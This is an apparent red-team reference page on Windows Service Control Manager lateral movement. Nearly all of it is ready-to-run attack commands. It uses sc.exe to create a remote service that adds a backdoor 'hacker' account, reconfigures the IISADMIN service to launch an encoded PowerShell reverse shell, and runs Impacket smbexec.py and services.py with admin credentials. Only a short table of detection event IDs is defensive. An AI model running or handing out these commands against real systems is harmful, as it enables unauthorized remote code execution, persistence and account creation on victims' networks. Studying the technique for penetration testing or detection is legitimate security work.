---
title: "Attack #59 — SCM Service Manager Lateral Movement"
description: "The Service Control Manager (SCM) allows remote service creation and management via named pipes (\\pipe\\svcctl). An attacker with admin credentials can…"
category: active-directory
subcategory: "Lateral Movement"
tags: ["active-directory", "lateral-movement"]
tools: ["Impacket", "PowerShell"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-Seven/⚫ Attack #59 — SCM Service Manager Lateral Movement.md"
---
# ⚫ Attack #59 — SCM / Service Manager Lateral Movement

***

## 📖 How It Works

The Service Control Manager (SCM) allows remote service creation and management via named pipes (`\pipe\svcctl`). An attacker with admin credentials can **create a Windows service** on a remote host that executes arbitrary commands as SYSTEM. This is essentially what `sc.exe` and `smbexec.py` use under the hood.

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **Local admin on target** | Required for SCM access |
| **SMB access (port 445)** | SCM operates over named pipes via SMB |

***

## 💻 Full Commands

```powershell
# ── Create remote service ─────────────────────────────────────────────────────
sc.exe \\TARGET create remotesvc binPath= "cmd.exe /c net user hacker P@ss! /add"
sc.exe \\TARGET start remotesvc
sc.exe \\TARGET delete remotesvc

# ── Modify existing service for stealth ───────────────────────────────────────
sc.exe \\TARGET config IISADMIN binPath= "cmd.exe /c powershell -e <base64_reverse_shell>"
sc.exe \\TARGET stop IISADMIN
sc.exe \\TARGET start IISADMIN
```

```bash
# ── Impacket smbexec.py (service-based, no binary on disk) ───────────────────
smbexec.py corp.local/Administrator:'Password1'@10.10.10.10

# ── services.py (direct service creation) ─────────────────────────────────────
services.py corp.local/Administrator:'Password1'@10.10.10.10 create -name evilsvc \
  -display "Evil" -path "cmd.exe /c whoami > C:\Temp\out.txt"
services.py corp.local/Administrator:'Password1'@10.10.10.10 start -name evilsvc
```

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **7045** | System Log | New service installed remotely |
| **4697** | Security Log | Service installation |

***

> ✅ **Attack #59 — SCM Lateral Movement complete.**
